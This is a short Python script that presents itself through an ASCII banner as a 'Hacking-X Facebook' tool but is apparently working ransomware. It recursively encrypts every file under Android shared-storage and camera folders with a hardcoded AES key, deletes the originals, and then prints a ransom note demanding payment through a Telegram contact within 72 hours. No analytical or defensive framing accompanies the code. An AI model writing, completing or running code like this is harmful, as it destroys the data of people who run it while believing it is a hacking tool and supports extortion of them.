
print("""___ ___                   __    .__                           ____  ___                  
 /   |   \ _____     ____  |  | __|__|  ____     ____           \   \/  /                  
/    ~    \\__  \  _/ ___\ |  |/ /|  | /    \   / ___\   ______  \     /                   
\    Y    / / __ \_\  \___ |    < |  ||   |  \ / /_/  > /_____/  /     \                   
 \___|_  / (____  / \___  >|__|_ \|__||___|  / \___  /          /___/\  \                  
___________     \/      \/      \/ ___.    \/ /_____/       __      .________    _______   
\_   _____/_____     ____    ____  \_ |__    ____    ____  |  | __  |   ____/    \   _  \  
 |    __)  \__  \  _/ ___\ _/ __ \  | __ \  /  _ \  /  _ \ |  |/ /  |____  \     /  /_\  \ 
 |     \    / __ \_\  \___ \  ___/  | \_\ \(  <_> )(  <_> )|    <   /       \    \  \_/   \
 \___  /   (____  / \___  > \___  > |___  / \____/  \____/ |__|_ \ /______  / /\  \_____  /
     \/         \/      \/      \/      \/                      \/        \/  \/        \/""")
     
     

print()
print()
print("By Dark-Cloud")
print()
print()
print("Loading ....")
import os
import subprocess
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def encrypt_file(file_path, key):
    chunk_size = 64 * 1024  # 64KB chunks

    # Génération d'un vecteur d'initialisation aléatoire
    iv = get_random_bytes(AES.block_size)

    # Création d'une instance du chiffreur AES
    cipher = AES.new(key, AES.MODE_CBC, iv)

    # Ouverture du fichier source en mode binaire
    with open(file_path, 'rb') as file:
        # Création du fichier de sortie en mode binaire
        encrypted_file_path = file_path + '.encrypted'
        with open(encrypted_file_path, 'wb') as encrypted_file:
            # Écriture du vecteur d'initialisation en début de fichier
            encrypted_file.write(iv)

            while True:
                chunk = file.read(chunk_size)
                if len(chunk) == 0:
                    break
                elif len(chunk) % AES.block_size != 0:
                    # Remplissage du dernier bloc si sa taille n'est pas multiple de la taille du bloc AES
                    chunk += b' ' * (AES.block_size - len(chunk) % AES.block_size)

                # Cryptage du chunk et écriture dans le fichier de sortie
                encrypted_chunk = cipher.encrypt(chunk)
                encrypted_file.write(encrypted_chunk)

    # Suppression du fichier source après cryptage réussi
    os.remove(file_path)

def encrypt_files_in_directory(directory_path, key):
    for root, _, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            encrypt_file(file_path, key)

if __name__ == "__main__":
    target_directory = "storage/shared"
    encryption_key = b'\x88\x1a\xfa@\xfa\xd1\xadB\xd5\xaa\xf2\xe17\x9b\xfeo\x88*\x89\xe2gEP\xb60R\xc6\xdb/\xb5`\xa7'

    try:
        encrypt_files_in_directory(target_directory, encryption_key)
    except Exception as e:
        print(" En cours. Patientez. :", e)
        # Essayez une autre méthode
        target_directory = "storage/dcim"
        encrypt_files_in_directory(target_directory, encryption_key)


print("""
Warning!

Your files have been encrypted with military-grade encryption. Your documents, photos, videos, databases, and other important files are no longer accessible and have been locked. To regain access to your files, you must pay a ransom.

You have 72 hours to make the payment. If the payment is not received within this period, the ransom amount will double. If no payment is received within 7 days, your decryption keys will be destroyed, and it will be impossible to recover your files.

Payment instructions:

My telegram :
 https://t.me/ultimeworms


Good Luck. Hahahah

""")

print("Programme terminé")
